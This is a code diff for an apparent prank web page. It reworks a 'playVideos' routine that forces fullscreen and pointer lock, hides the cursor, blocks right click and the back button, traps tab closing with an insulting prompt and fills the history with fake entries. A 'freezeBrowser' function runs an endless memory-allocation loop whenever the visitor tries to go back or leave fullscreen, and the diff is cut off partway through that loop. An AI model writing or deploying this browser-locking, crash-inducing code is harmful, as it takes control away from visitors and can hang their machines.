@@ -57,43 +57,37 @@ function setup(configs) {
 }
 
 // Troll functions
-let cpuLagActive = false;
+let freezeActive = false;
 function playVideos() {
-  // 1. Enter Fullscreen
-  if (document.documentElement.requestFullscreen) {
-    document.documentElement.requestFullscreen();
-  } else if (document.documentElement.webkitRequestFullscreen) {
-    document.documentElement.webkitRequestFullscreen();
-  } else if (document.documentElement.mozRequestFullScreen) {
-    document.documentElement.mozRequestFullScreen();
-  } else if (document.documentElement.msRequestFullscreen) {
-    document.documentElement.msRequestFullscreen();
-  }
-  // 2. Request/Enter Pointer Lock
-  if (document.documentElement.requestPointerLock) {
-    document.documentElement.requestPointerLock();
-  } else if (document.documentElement.webkitRequestPointerLock) {
-    document.documentElement.webkitRequestPointerLock();
-  } else if (document.documentElement.mozRequestPointerLock) {
-    document.documentElement.mozRequestPointerLock();
-  } else if (document.documentElement.msRequestPointerLock) {
-    document.documentElement.msRequestPointerLock();
-  }
-  // 3. Ask Before Closing
-  window.onbeforeunload = function() {
-    return "Oh you little brat!";
-  };
-  // 4. Block Back Button
-  history.pushState(null, "", location.href);
-  window.onpopstate = function() {
-    history.pushState(null, "", location.href);
-    activateCPULag(); // If they try to go back, crash the browser
-  };
-  // 5. Hide Cursor
-  document.body.style.cursor = "none";
-  // 6. Remove info button because it disables fullscreen
+  // Ask Before Closing
+  window.onbeforeunload = function() {return "Oh you little brat!"};
+  // Remove Info Button
   document.querySelector('i').remove();
-  // 7. Fill History with Fake Entries
+  // Hide Cursor
+  document.body.style.cursor = "none";
+  // Enter Fullscreen/Pointer Lock on Click
+  document.body.addEventListener('click', () => { 
+    (document.documentElement.requestFullscreen || document.documentElement.webkitRequestFullscreen || document.documentElement.mozRequestFullScreen || document.documentElement.msRequestFullscreen)?.call(document.documentElement);
+    (document.documentElement.requestPointerLock || document.documentElement.webkitRequestPointerLock || document.documentElement.mozRequestPointerLock || document.documentElement.msRequestPointerLock)?.call(document.documentElement);
+  });
+  // Block Right Click
+  document.body.addEventListener('contextmenu', (event) => event.preventDefault());
+  // Block Back Button/Freeze Browser on Go Back
+  history.pushState(null, "", location.href);
+  window.onpopstate = function() {history.pushState(null, "", location.href); freezeBrowser();};
+  // Freeze Browser on Fullscreen Exit
+  document.addEventListener("fullscreenchange", () => {if (!document.fullscreenElement) {freezeBrowser();}});
+  // Enter Fullscreen
+  if (document.documentElement.requestFullscreen) {document.documentElement.requestFullscreen();}
+  else if (document.documentElement.webkitRequestFullscreen) {document.documentElement.webkitRequestFullscreen();}
+  else if (document.documentElement.mozRequestFullScreen) {document.documentElement.mozRequestFullScreen();}
+  else if (document.documentElement.msRequestFullscreen) {document.documentElement.msRequestFullscreen();}
+  // Request/Enter Pointer Lock
+  if (document.documentElement.requestPointerLock) {document.documentElement.requestPointerLock();}
+  else if (document.documentElement.webkitRequestPointerLock) {document.documentElement.webkitRequestPointerLock();}
+  else if (document.documentElement.mozRequestPointerLock) {document.documentElement.mozRequestPointerLock();}
+  else if (document.documentElement.msRequestPointerLock) {document.documentElement.msRequestPointerLock();}
+  // Fill History with Fake Entries
   for (let i = 0; i < 20; i++) {
     history.pushState(null, "", location.href + "?p=" + i);
   }
@@ -104,24 +98,11 @@ function playVideos() {
   } else if (params.has("letmeout")) {
     history.replaceState(null, "", location.pathname + "?letmeout");
   }
-  // 8. If the body was clicked, enter fullscreen and enter/request pointer lock, usefull if only fullscreen entered when clicked on the button.
-  document.body.addEventListener('click', () => { 
-    (document.documentElement.requestFullscreen || document.documentElement.webkitRequestFullscreen || document.documentElement.mozRequestFullScreen || document.documentElement.msRequestFullscreen)?.call(document.documentElement);
-    (document.documentElement.requestPointerLock || document.documentElement.webkitRequestPointerLock || document.documentElement.mozRequestPointerLock || document.documentElement.msRequestPointerLock)?.call(document.documentElement);
-  });
-  // 9. Block right click
-  document.body.addEventListener('contextmenu', (event) => event.preventDefault());
-  // 10. If they exit fullscreen, crash the browser
-  document.addEventListener("fullscreenchange", () => {
-    if (!document.fullscreenElement) {
-      activateCPULag();
-    }
-  });
-  // Crash Browser function
-  function activateCPULag() {
-    if (cpuLagActive) return; // Prevent multiple activations
-    cpuLagActive = true;
-    console.log("🔥 lag 🔥");
+  // Freeze Browser function
+  function freezeBrowser() {
+    if (freezeActive) return;
+    freezeActive = true;
+    console.log("🔥 freeze 🔥");
     setInterval(() => {
       let arr = [];
       while (true) {
